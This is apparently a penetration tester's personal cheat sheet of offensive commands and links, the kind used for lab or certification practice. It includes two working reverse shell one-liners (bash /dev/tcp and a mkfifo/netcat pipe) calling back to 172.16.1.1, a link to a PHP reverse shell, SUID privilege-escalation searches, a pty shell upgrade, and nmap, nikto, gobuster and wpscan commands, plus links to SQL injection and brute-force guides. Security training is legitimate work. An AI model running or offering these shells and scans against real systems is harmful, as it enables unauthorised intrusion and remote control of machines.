# Hacker-Notes

PimpMyKali - https://github.com/Dewalt-arch/pimpmykali

Payloads - 

#!/bin/bash
bash -i >& /dev/tcp/172.16.1.1/443 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.16.1.1 4434 >/tmp/f

Windows reverse shell .php - https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php

SUIDS etc

find / -user root -perm -4000 -print 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find / -user root -perm -4000 -exec ls -ldb {} \;

nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oA full 192.168.180.96     

Intense Scan all tcp ports - nmap -p 1-65535 -T4 -A -v IP ADDRESS

Intense Scan UDP - nmap -sS -sU -T4 -A -v IP ADDRESS

SMB ENUM - nmap --script smb-enum-shares -p 139,445 IP ADDRESS

Vuln nmap scan - nmap --script vuln IP ADDRESS - https://www.bencode.net/posts/2018-08-10-cyber-cno-boot2root/

SQL injection cheat sheet - https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/

MSSQL cheat sheet - https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server

Hydra usage - https://redteamtutorials.com/2018/10/25/hydra-brute-force-techniques/

Fuzzing Paths and files - https://wfuzz.readthedocs.io/en/latest/user/basicusage.html

SMB scans - https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html

SMB Map - https://tools.kali.org/information-gathering/smbmap

Null sessions RPC etc - https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html

upgrade Python shell - python -c 'import pty; pty.spawn("/bin/bash")'

nikto -host=http://10.10.10.29
dirb http://10.10.10.29
gobuster dir -u https://10.11.1.237/web1/web/ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
gobuster dir -u http://10.11.1.8 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
wpscan --url http://10.10.10.29/wordpress
